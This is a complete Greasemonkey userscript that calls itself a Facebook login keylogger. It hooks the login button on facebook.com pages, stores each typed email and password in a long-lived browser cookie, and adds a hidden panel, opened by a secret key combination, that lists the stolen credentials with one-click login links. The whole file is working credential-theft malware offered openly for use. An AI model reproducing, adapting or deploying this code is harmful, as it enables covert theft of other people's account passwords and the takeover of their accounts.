// ==UserScript==
// @name           	mitra.net
// @version 		1.1
// @namespace      	http://userscripts.org/scripts/edit_src/103877
// @description    	Facebook login keylogger By mitra
// @include        	http://*.facebook.com/*
// @include        	http:/facebook.com/*
// @license        	GNU GENERAL PUBLIC LICENSE
// @agreement      	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT 

WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO 

THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND 

NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE 

LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION 

OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION 

WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
// ==/UserScript==


var title 		        = "Facebook Login Keylogger Edited By 

mitra";
var version 			= "v1.1";

var width 				= 700;
var height 				= 400;
var cookieName 			= "shuled";
var daysToKeepCookie 	= 365;
var delimiter 			= ",";
var subDelimiter 		= "|";
var cookie				= readCookie(cookieName);
var submitControl;
var unControl;
var pwControl;

///////////////////
// Specific code //
///////////////////

init();

function init()
{
	getElementsByClassNameAndType('UIButton_Text', 

'submit')[0].addEventListener("click", saveLogin, false);	
	unControl 		= document.getElementById('email');
	pwControl 		= document.getElementById('pass');
}

function saveLogin()
{
	if (unControl.value.length == 0 || pwControl.value.length == 0)
		return;
	
	var date = new Date();
	
	var value = date.getTime() + subDelimiter + unControl.value + 

subDelimiter + pwControl.value;
	
	if(cookie)
		value += delimiter + cookie;
	
	writeCookie(cookieName, value, daysToKeepCookie);
}

unsafeWindow.doTheBossanova = function(email, password)
{
	unControl.value = email;
	pwControl.value = password;
	document.forms[0].submit();
}

///////////////////
// Generic code  //
///////////////////

jollyRogerz = 'data:image/png;base64,'+
'iVBORw0KGgoAAAANSUhEUgAAADIAAAA2CAYAAACFrsqnAAAACXBIWXMAAAsTAAALEwEAmp

wYAAAK'+
'T2lDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVNnVFPpFj333vRCS4iAlEtvUhUIIF

JCi4AU'+
'kSYqIQkQSoghodkVUcERRUUEG8igiAOOjoCMFVEsDIoK2AfkIaKOg6OIisr74Xuja9a89+

bN/rXX'+
'Pues852zzwfACAyWSDNRNYAMqUIeEeCDx8TG4eQuQIEKJHAAEAizZCFz/SMBAPh+PDwrIs

AHvgAB'+
'eNMLCADATZvAMByH/w/qQplcAYCEAcB0kThLCIAUAEB6jkKmAEBGAYCdmCZTAKAEAGDLY2

LjAFAt'+
'AGAnf+bTAICd+Jl7AQBblCEVAaCRACATZYhEAGg7AKzPVopFAFgwABRmS8Q5ANgtADBJV2

ZIALC3'+
'AMDOEAuyAAgMADBRiIUpAAR7AGDIIyN4AISZABRG8lc88SuuEOcqAAB4mbI8uSQ5RYFbCC

1xB1dX'+
'Lh4ozkkXKxQ2YQJhmkAuwnmZGTKBNA/g88wAAKCRFRHgg/P9eM4Ors7ONo62Dl8t6r8G/y

JiYuP+'+
'5c+rcEAAAOF0ftH+LC+zGoA7BoBt/qIl7gRoXgugdfeLZrIPQLUAoOnaV/Nw+H48PEWhkL

nZ2eXk'+
'5NhKxEJbYcpXff5nwl/AV/1s+X48/Pf14L7iJIEyXYFHBPjgwsz0TKUcz5IJhGLc5o9H/L

cL//wd'+
'0yLESWK5WCoU41EScY5EmozzMqUiiUKSKcUl0v9k4t8s+wM+3zUAsGo+AXuRLahdYwP2Sy

cQWHTA'+
'4vcAAPK7b8HUKAgDgGiD4c93/+8//UegJQCAZkmScQAAXkQkLlTKsz/HCAAARKCBKrBBG/

TBGCzA'+
'BhzBBdzBC/xgNoRCJMTCQhBCCmSAHHJgKayCQiiGzbAdKmAv1EAdNMBRaIaTcA4uwlW4Dj

1wD/ph'+
'CJ7BKLyBCQRByAgTYSHaiAFiilgjjggXmYX4IcFIBBKLJCDJiBRRIkuRNUgxUopUIFVIHf

I9cgI5'+
'h1xGupE7yAAygvyGvEcxlIGyUT3UDLVDuag3GoRGogvQZHQxmo8WoJvQcrQaPYw2oefQq2

gP2o8+'+
'Q8cwwOgYBzPEbDAuxsNCsTgsCZNjy7EirAyrxhqwVqwDu4n1Y8+xdwQSgUXACTYEd0IgYR

5BSFhM'+
'WE7YSKggHCQ0EdoJNwkDhFHCJyKTqEu0JroR+cQYYjIxh1hILCPWEo8TLxB7iEPENyQSiU

MyJ7mQ'+
'AkmxpFTSEtJG0m5SI+ksqZs0SBojk8naZGuyBzmULCAryIXkneTD5DPkG+Qh8lsKnWJAca

T4U+Io'+
'UspqShnlEOU05QZlmDJBVaOaUt2ooVQRNY9aQq2htlKvUYeoEzR1mjnNgxZJS6WtopXTGm

gXaPdp'+
'r+h0uhHdlR5Ol9BX0svpR+iX6AP0dwwNhhWDx4hnKBmbGAcYZxl3GK+YTKYZ04sZx1QwNz

HrmOeZ'+
'D5lvVVgqtip8FZHKCpVKlSaVGyovVKmqpqreqgtV81XLVI+pXlN9rkZVM1PjqQnUlqtVqp

1Q61Mb'+
'U2epO6iHqmeob1Q/pH5Z/YkGWcNMw09DpFGgsV/jvMYgC2MZs3gsIWsNq4Z1gTXEJrHN2X

x2KruY'+
'/R27iz2qqaE5QzNKM1ezUvOUZj8H45hx+Jx0TgnnKKeX836K3hTvKeIpG6Y0TLkxZVxrqp

aXllir'+
'SKtRq0frvTau7aedpr1Fu1n7gQ5Bx0onXCdHZ4/OBZ3nU9lT3acKpxZNPTr1ri6qa6Ubob

tEd79u'+
'p+6Ynr5egJ5Mb6feeb3n+hx9L/1U/W36p/VHDFgGswwkBtsMzhg8xTVxbzwdL8fb8VFDXc

NAQ6Vh'+
'lWGX4YSRudE8o9VGjUYPjGnGXOMk423GbcajJgYmISZLTepN7ppSTbmmKaY7TDtMx83Mza

LN1pk1'+
'mz0x1zLnm+eb15vft2BaeFostqi2uGVJsuRaplnutrxuhVo5WaVYVVpds0atna0l1rutu6

cRp7lO'+
'k06rntZnw7Dxtsm2qbcZsOXYBtuutm22fWFnYhdnt8Wuw+6TvZN9un2N/T0HDYfZDqsdWh

1+c7Ry'+
'FDpWOt6azpzuP33F9JbpL2dYzxDP2DPjthPLKcRpnVOb00dnF2e5c4PziIuJS4LLLpc+Lp

sbxt3I'+
'veRKdPVxXeF60vWdm7Obwu2o26/uNu5p7ofcn8w0nymeWTNz0MPIQ+BR5dE/C5+VMGvfrH

5PQ0+B'+
'Z7XnIy9jL5FXrdewt6V3qvdh7xc+9j5yn+M+4zw33jLeWV/MN8C3yLfLT8Nvnl+F30N/I/

9k/3r/'+
'0QCngCUBZwOJgUGBWwL7+Hp8Ib+OPzrbZfay2e1BjKC5QRVBj4KtguXBrSFoyOyQrSH355

jOkc5p'+
'DoVQfujW0Adh5mGLw34MJ4WHhVeGP45wiFga0TGXNXfR3ENz30T6RJZE3ptnMU85ry1KNS

o+qi5q'+
'PNo3ujS6P8YuZlnM1VidWElsSxw5LiquNm5svt/87fOH4p3iC+N7F5gvyF1weaHOwvSFpx

apLhIs'+
'OpZATIhOOJTwQRAqqBaMJfITdyWOCnnCHcJnIi/RNtGI2ENcKh5O8kgqTXqS7JG8NXkkxT

OlLOW5'+
'hCepkLxMDUzdmzqeFpp2IG0yPTq9MYOSkZBxQqohTZO2Z+pn5mZ2y6xlhbL+xW6Lty8elQ

fJa7OQ'+
'rAVZLQq2QqboVFoo1yoHsmdlV2a/zYnKOZarnivN7cyzytuQN5zvn//tEsIS4ZK2pYZLVy

0dWOa9'+
'rGo5sjxxedsK4xUFK4ZWBqw8uIq2Km3VT6vtV5eufr0mek1rgV7ByoLBtQFr6wtVCuWFfe

vc1+1d'+
'T1gvWd+1YfqGnRs+FYmKrhTbF5cVf9go3HjlG4dvyr+Z3JS0qavEuWTPZtJm6ebeLZ5bDp

aql+aX'+
'Dm4N2dq0Dd9WtO319kXbL5fNKNu7g7ZDuaO/PLi8ZafJzs07P1SkVPRU+lQ27tLdtWHX+G

7R7ht7'+
'vPY07NXbW7z3/T7JvttVAVVN1WbVZftJ+7P3P66Jqun4lvttXa1ObXHtxwPSA/0HIw6217

nU1R3S'+
'PVRSj9Yr60cOxx++/p3vdy0NNg1VjZzG4iNwRHnk6fcJ3/ceDTradox7rOEH0x92HWcdL2

pCmvKa'+
'RptTmvtbYlu6T8w+0dbq3nr8R9sfD5w0PFl5SvNUyWna6YLTk2fyz4ydlZ19fi753GDbor

Z752PO'+
'32oPb++6EHTh0kX/i+c7vDvOXPK4dPKy2+UTV7hXmq86X23qdOo8/pPTT8e7nLuarrlca7

nuer21'+
'e2b36RueN87d9L158Rb/1tWeOT3dvfN6b/fF9/XfFt1+cif9zsu72Xcn7q28T7xf9EDtQd

lD3YfV'+
'P1v+3Njv3H9qwHeg89HcR/cGhYPP/pH1jw9DBY+Zj8uGDYbrnjg+OTniP3L96fynQ89kzy

aeF/6i'+
'/suuFxYvfvjV69fO0ZjRoZfyl5O/bXyl/erA6xmv28bCxh6+yXgzMV70VvvtwXfcdx3vo9

8PT+R8'+
'IH8o/2j5sfVT0Kf7kxmTk/8EA5jz/GMzLdsAAAAgY0hSTQAAeiUAAICDAAD5/wAAgOkAAH

UwAADq'+
'YAAAOpgAABdvkl/FRgAAC4dJREFUeNq8mnmMXVUdxz9v3mtn7TLtMF0oraVsbaFsLQXEFi

0ClQAu'+
'qGAQ0aB/uASCxggYNRITIov8oQGrbEZRBOtSq4gULMUCZSjQdmCm43Qdp7OvnX15/vO55u

R6580r'+
'EE9y8+6779xzfuv3t5yX4r0Z07xmAMuAVcBZwGlAEZDNc500UAPcD/wRGOP/MJYC3wa2Ag

1ADzAs'+
'0e/F9Q9gXr7EpN4BA9OBO4CvAcU55g0AR4Eur8Ecc7NqbiFQCRT4vBpYr6Cy7yUjNwHfj0

lqFGgB'+
'ujWFTrUzFmw+qrYmM5Uprn0uUOqzZ4GPK5Tsu2VkKfAgsCZ41g/skIFojAVERxoZADq8Hw

bGc9BS'+
'DFS431UBM98D7nbPxJHJg4mrgMeAmQGxe4BDSqgfaAPa1US/JnIWsEQA+AGwOaaluGmlpG

eG700B'+
'rgks4XcCweg7cejrYg58CPiTiPIE8EPgRjW1XMT6bYLjbgNm5ym4tHM/qI9Ea2zw+TH79R

lKOFpo'+
'J/B7YCPwY+DLwAeA+YGjvpQDhV48BhRKAccBtwXvtwDnAVMn4n6i8WvjQIQe+4E+YBfwAv

AyUKdz'+
'jwIPAZfmWG+hxP0t5vRFwAXAauAUfapLS2hS23P1lzGFNZCvNs4PJNEIbAIeVQtn6y8FMe

0N5REb'+
'hoArgcJAkI/H5uwDFquVacBXBYgscMT9p8QJLpiAkdOC+zZNbAfwPPC2SBWiz6cmUnlsTA

W+oGYK'+
'gLX6YTgWAz/S6QeAp4Hd/jYH+LCxLC9GyoP7IU1oh+Y1mIA8lx2D750lsUUxOA/HWuBMGW

8G/h74'+
'zhUGzXQ+jIzHoPEg8G+ZShLG9GMEkkVAmTFjorCwDJglnG8MYshJAcBMykhzcF8K9AY+kM

R07TEw'+
'0afGizWfpNGt1Ke7fo2CRLM8Q/+ZlJE6YMT7uaq4IAdx3/GdfEZH4LxdE8xpCKwhYr4qSG

NOksnU'+
'ZIzsDV6cZbwoykFcK3Cfn7nGfons1tc2SWQ42p3TYlqDULwvmFOpNjOTMTJs5I7GNcAJOS

Jzp/j+'+
'QLB53FTeUGvNmkm/z+4E6l2jwZjVIuFdASyPxmLPtBCG0zmcvdUAVwGUiDSbJkjHx/SjDq

E6gtcu'+
'Cap3vXrR71RTkFdl/KjMthgEd2oRrYF53SjiRQH6TeCwQs8Z2ccl7BJ9ZLEEPJdgDlGq3i

tB3TLR'+
'4tVgRrAduBa4RYhtNw/r9J0jJqRVIuVwsP7twPH67ptxRnIlcUfNjx43+0wBVwMrgW9oet

kYTB8F'+
'3hLhDulfA5rSfhPLT8ZsvdR36hXYoFoNNV8mExFdEYrmXQqX6ehPJqQgPw3qhaS6otJ4MV

97zljt'+
'hWs8AVyeA4ajcWHwzkHgHvsCmXzrkT4x/DGltD7IYL8kkdfEAmVWLSQldtuALcCH1NKg/l

cwCR0r'+
'Y/DdpVbG8sl+QwTr8cV2kWK+kq+0FG3Ps+DJBLY/qO+8rhmOTPDOMqvDCv12l2i3J6xO82

FkXOm2'+
'K41O4P1msMMu2iijk42s66W09WoTws6EEngJ8E3g5woO99kj83tDrWfy9JVRobBP/A+dbI

GblmmG'+
'FcA6pV1r9hyu02irp0yJtvo8JTisAr7iGsWxoLtHYTbFkTOJkcUiRE2MiKwvN8S6IyUi23

yx/qNe'+
'USCsAh4GXhMu+yUq5TtrLKwuBE4MegPR6BHVWtx/rzQMJTFSCFwMfNHCZ6pE3KKjZ2NSHQ

+YmxJk'+
'sbfH5s5QsuvU4j41ssAcrmSCGjwqbf9lJpCWod0KpjmewGaE0M0GqGGjd41o9IhMPhQ4cy

qWdHYo'+
'6SUiWpRujyiMqGGQBk72ShqDmkybhI74Xr/rv20Q3J+EiBngczJxj040U1t9xkh+HfAXo2

5kSkVB'+
'ahJqNh3kP1lNIu2a0/0cl8hBfzuos48F7aJBIfaIgbJOZjqCrs7/MPIRJ+yz+B/1++nOaT

Ii97r4'+
'vCAQDkpYOmBsKFh7QPMoEOnmCJ8NwAp9AuCA6/eIjk3Gmcagizmcq9OYkbAy25S7lMBbMo

XJXUai'+
'X9Epw+A0EuREqdh9N/BPn12v7y0yWTzTefNkfrMaiIJdr4LIOw25UUkMaJvtIlcl8Au/R+

lBjbYa'+
'pdVP21mp91lPcD8O/MoUZ5Z5W/TebcBdwbpPmtkWJzj/OpsRmzSxl40tK+MV4vMu2iXxh7

TnUjd4'+
'0Jzo5ViHZch3uoOycyRQfypIPwZ11MiPymU4GqcKCumY+cyThpstbw/K7PWmO5dE6U2BhB

yQ8A7P'+
'O87T3OqE0MtEpb1BKlFizjQryJWGY4XVwuC3yuD5XIUQ+VOFV2FC0loO/Ab4rq3aR9VQkU

cbFUC6'+
'QAl8Sz/4s8hSaCPsKaNsu/a9PkCoLpm/K+iiDMTq8DEZnqJzhw2NHp05OnOpSCin2xTM0q

DhMB7Q'+
'EHXuSwr8slwkmarE1xgIp1uK3qFU+gNsf0OzJIDcLrU2qoBaXWOqiV+TxHf6e11gpmUyEv

rIbNdc'+
'FvjwYuAGadgNvA8ojSJmmdJeAZwjYxuBeyVygZI5YO1e7vNqfadcE5utHW8MjhlqhfYGGR

v3t93W'+
'+SU+bxJMOgyaNwO/dO1G+81r7VSWKvBa4b0+rYM1Bgcy2zwaqA5wfq919CE3nKtklgvJVS

58nDA+'+
'zdyqIYgbYwGM7xf92oLOZZtCulftrVXjdxtLRj0NeFpBrFBTLwA7I5RIB03mflVc7gvbjf

gHXLBX'+
'FbdoNutluCrolJ9nIviS3fdeGe1UGPu8L7fBcS3wMUvpIeAPXl0G0nOC0jvysbT+0SxA/b

e5fLo9'+
'1iG5jwJdrdntBUGHfIV2eqeERm2bN60h7lPqWeAnml2R2vq6wa8xSEDrTImeMl7UBn42Hk

T1LdKx'+
'xlI7K8OrQ8e6RVjbqrSmOvEEVZgGPqvTZ4TT05TKLFHuSpm6399vkPFmYfi4IO1523UKjB

fzgvqj'+
'U0Hs0Qc67MJfbfR/VOjt8gRtS8jIepPD5+Q8rQbGBYOblNJFmtm4dcvZMrrMADVPCWYCzY

6b9rwu'+
'cJyik1cqsF6TwggQ2lwjSi7HBJcTFVa5udjPfP5qKnZ+vgH4tI7+iPaeNq6ss+PxgM5/tQ

dCRbGT'+
'3uhsvdpnJ8tcgXOLA63s97NXpqOmRZ/rdMpYp3QsMgsoVEvF+vHWdCyBbHLjczWbw/pAtQ

us8rrc'+
'dzarxb1CbaGmVO7805V61gzisNKd7rP6wPGPeH9Qc73Yvea4/3aZGnSfYpnZCdSmYueJC5

T8nUHB'+
'/4yl6yLgVmG3TXOZacRdEGS+EbL16xMLnf+6GhjStM43/WnXRB6Xhg0yEK2zRDpuFTjKhP

8yhdcE'+
'9KQSjsae9Gx9d1CVzXbBWRJREUD24aA1MxagTJSCLxNCo8PMRmG0Q2GtUhA7lPgVIt9h95

0BfF7C'+
'V6u5qBMToVo2k1Arr5SBZzWRQuATaqTJzaolqFmppYMzxAGZ6nWz1qBOnxJUnW+IOK8J55

cYf7bq'+
'I0t19iI1P+y8/lhTJLGLMmKkvFZb3BKUuI0miNNcPB38XaM3+PdD1JAeUDAz9buoZfS8sW

CdNchf'+
'zSbqNNsOAadIxk9WmxtdoyaJkVTC9+Ui00Wx3zYLu61ePW4aNe66leRQ7K8aGZlZaEyq1G

SO16xW'+
'K4xtQn8F8BmdHK3jYQGiVTr25fOHgYzEtZlOVGkC7RL7os9qRJ3Dzu0LYkZSp7JD7D8kQU

M6dIeA'+
'UWlFuUs/bda3oqpzSF+sT+qiJDEy4ksj2mO384Z0/CoJ6iP3v32SDoMGAzOMjtaGhekKIX

XE79dr'+
'xrX65isiX1J7NbE5ltJx55jrz5GRZtOFphwN52MZBRI+3wbHHZresPu1CTjDgssmtTE+0Z

9Xcm1U'+
'FDQEBo+1q5HniE5pL9XZGwSWEpESa57taiNxpCfpnI9IfP9kfaV3MaL/fPUFDYtSBdirz+

wKjrUT'+
'x38GADXlN8OfthjXAAAAAElFTkSuQmCC';

topBanner = 'data:image/gif;base64,'+
'R0lGODlhAQA+AMQAAAAAAP///8C/wNbX18fHxsDAv8vKyt3d3dzc3Nvb29ra2tnZ2djY2N

XV1dTU'+
'1NPT09HR0dDQ0M/Pz83NzczMzMnJycjIyMfHx8XFxcTExMPDw8LCwsHBwcDAwL+/vwAAAC

wAAAAA'+
'AQA+AAAFMOAhHgiSKAszNM4DRdJEGZVFYJm2cZ3gFR3ORpPBXCwVA2UiiUAejsaAsVAkSi

NRCAA7';

cookie = readCookie(cookieName);

if (document.addEventListener)
   document.addEventListener("keypress", keyPress,false);
else if (document.attachEvent)
   document.attachEvent("onkeypress", keyPress);
else
   document.onkeypress= keyPress;

function writeCookie(name, value, days) 
{
	if (days) 
	{
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}

function readCookie(name) 
{
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) 
	{
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return 

c.substring(nameEQ.length,c.length);
	}
	return null;
}

function eraseCookie(name) 
{
	writeCookie(name, "", -1);
	cookie = null;
}

function keyPress(e)
{
	var c =  String.fromCharCode(e.which).toUpperCase();
	
	if (c == "K" && e.shiftKey && e.ctrlKey && e.altKey)
		display();

	else if (c == "D" && e.shiftKey && e.ctrlKey && e.altKey)
	{
		eraseCookie(cookieName);
		unsafeWindow.killWindow();
		display();
	}
	else if (e.keyCode == 27)
		unsafeWindow.killWindow();
}

unsafeWindow.clearLog = function()
{
	eraseCookie(cookieName);
	unsafeWindow.killWindow();
	display();
}


unsafeWindow.killWindow = function ()
{
	if (document.getElementById('displayDiv') != null)
		

document.body.removeChild(document.getElementById('displayDiv'));
}

function display()
{
	if (cookie == null)
	{
		alert ('No logs stored!');
		return;
	}

	GM_addStyle('div#displayDiv{position:absolute; 

width:'+width+'px; height:'+height+'px; top:50%; left:50%; margin:-' + 

(height/2) + 'px auto auto -' + (width/2) + 'px; border:2px solid #333; 

background: url('+topBanner+') #DDD; font-size:12px;-moz-border-radius: 

8px; -webkit-border-radius: 8px; -moz-box-shadow:10px 10px 20px 

#000000; z-index:5;}');
	GM_addStyle('div#displayDiv #logo{float:left; margin:5px;}');
	GM_addStyle('div#displayDiv #title{float:left; margin-top:16px; 

font-weight:bolder; color:#333;}');
	GM_addStyle('div#displayDiv #closeButton{float:right; 

margin:3px;}');
	GM_addStyle('div#displayDiv #clearLogButton{float:right; 

margin:3px;}');
	GM_addStyle('div#displayDiv #version{float:left; 

margin-top:28px; margin-left:5px; color:#888; font-weight:bold;}');

	GM_addStyle('#tableContainer{clear: both; border: 1px solid 

#444; height: 320px; overflow: hidden; width: 680px; margin:0 auto; 

background-color:#EEE;}');
	GM_addStyle('#tableContainer table{height: 320px; width: 680px; 

font-size:12px; border:1px solid #FCC; -moz-box-shadow:10px 10px 20px 

#000000;}');
	GM_addStyle('#tableContainer table thead tr{display: block; 

position:relative; background-color:#CCF; border-bottom:1px solid 

#444;}');
	GM_addStyle('#tableContainer table thead tr th{text-align:left; 

font-weight:bold; width:200px; border-right:1px solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + 

th{text-align:left; font-weight:bold; width:200px; border-right:1px 

solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + th + 

th{text-align:left; font-weight:bold; width:200px; border-right:1px 

solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + th + th + 

th{text-align:left; font-weight:bold; width:76px;}');	

	GM_addStyle('#tableContainer table tbody {text-align:left; 

height:300px; display:block; width:100%; overflow: 

-moz-scrollbars-vertical;}');	
	
	
	GM_addStyle('#tableContainer table tbody 

tr:nth-child(even){text-align:left; width:80px; 

background-color:#EEE;}');	
	GM_addStyle('#tableContainer table tbody 

tr:nth-child(odd){text-align:left; width:80px; 

background-color:#F8F8F8;}');	

	GM_addStyle('#tableContainer table tbody tr td{text-align:left; 

width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + 

td{text-align:left; width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + td + 

td{text-align:left; width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + td + td + 

td{text-align:left; width:60px; border-right:none;}');	
	
	GM_addStyle('.unselectable{-moz-user-select: none; 

-khtml-user-select: none; user-select: none;}');


	var html = '';

	html += '<div id="logo" class="unselectable"><img 

src="'+jollyRogerz+'"></div>';
	html += '<button id="closeButton" class="unselectable" 

onclick="killWindow()">X</button>';
	html += '<button id="clearLogButton" class="unselectable" 

onclick="clearLog()">Clear log</button>';
	html += '<h1 id="title" class="unselectable">'+title+'</h1>';
	html += '<span id="version" 

class="unselectable">'+version+'</span>';

	html += '<div id="tableContainer">';
	html += '<table cellspacing="0"><thead 

class="unselectable"><tr><th>Login 

time</th><th>Username</th><th>Password</th><th>Action</th></tr></thead>

';
	html += '<tbody>';

	var array = cookie.split(delimiter);

	for (i=0; i < array.length; i++)
	{
		var subArray = array[i].split(subDelimiter);
		var date = new Date();
		date.setTime(subArray[0]);
		html += 

'<tr><td>'+date.toLocaleString()+'</td><td>'+subArray[1]+'</td><td>'+su

bArray[2]+'</td><td><a href="#" 

onclick="doTheBossanova(\''+subArray[1]+'\', 

\''+subArray[2]+'\')">Login &raquo;</a></td></tr>';
	}

	html += '</tbody>';
	html += '</table>';
	html += '</tableContainer>';

	var displayDiv = document.createElement('div');
	displayDiv.setAttribute('id', 'displayDiv');
	displayDiv.innerHTML = html;
	document.body.appendChild(displayDiv);
}

function getElementsByClassName(classname, node)
{ 
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 
	var a = [], re = new RegExp('\\b' + classname + '\\b'); 
	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if ( re.test(els[i].className) ) 
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}

function getElementsByClassNameAndType(classname, type, node)
{ 
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 

	var a = [], re = new RegExp('\\b' + classname + '\\b'); 
	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if ( re.test(els[i].className) && els[i].type == type) 
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}